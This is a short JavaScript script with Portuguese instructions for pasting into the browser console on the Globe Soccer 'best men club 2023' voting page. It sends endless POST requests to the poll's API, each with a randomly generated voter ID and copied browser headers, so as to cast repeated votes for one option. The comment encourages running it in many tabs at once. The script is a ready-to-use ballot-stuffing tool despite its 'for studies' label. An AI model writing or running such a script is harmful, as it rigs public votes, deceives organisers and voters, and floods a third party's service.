/*
   SCRIPT FEITO PARA ESTUDOS! FEITO POR https://twitter.com/lucasdepace
   PARA EXECUTAR:
   - IR PARA A PÁGINA: https://vote.globesoccer.com/vote/best-men-club-2023/?embed=false
   - APERTAR F12 (OU CNTRL+SHIFT+C, dependendo do navegador)
   - IR NA ABA CONSOLE
   - COLAR O CÓDIGO E APERTAR ENTER
   - PARA PARAR, FECHAR A ABA

   PS: DÁ PRA ABRIR QUANTAS ABAS QUISER E RODAR EM CADA UMA DELAS SIMULTANEAMENTE
*/


const baseUrl = 'https://0l51a8xu73.execute-api.eu-west-1.amazonaws.com/production/votes';
const eventCode = 'MENCLUB2023';
const referer = 'https://vote.globesoccer.com/';


function makeRequest() {
  return new Promise(resolve => {
    const id = generateUUID();
    console.log('UUID gerado:', id);

    fetch(baseUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'authority': '0l51a8xu73.execute-api.eu-west-1.amazonaws.com',
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9',
        'origin': 'https://vote.globesoccer.com',
        'referer': referer,
        'sec-ch-ua': '"Chromium";v="118", "Opera";v="104", "Not=A?Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0'
      },
      body: `eventCode=${eventCode}&voterId=${id}&hash=&vote=9`
    })
    .then(response => {
      console.log('Response:', response.status);
      resolve(); // Resolve the promise when the request is completed
    })
    .catch(error => {
      console.error('Error:', error);
      resolve(); // Resolve the promise even if there's an error
    });
  });
}

async function sendRequests() {
  while(true){
    await makeRequest();
  }
}

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// Start sending requests
sendRequests();
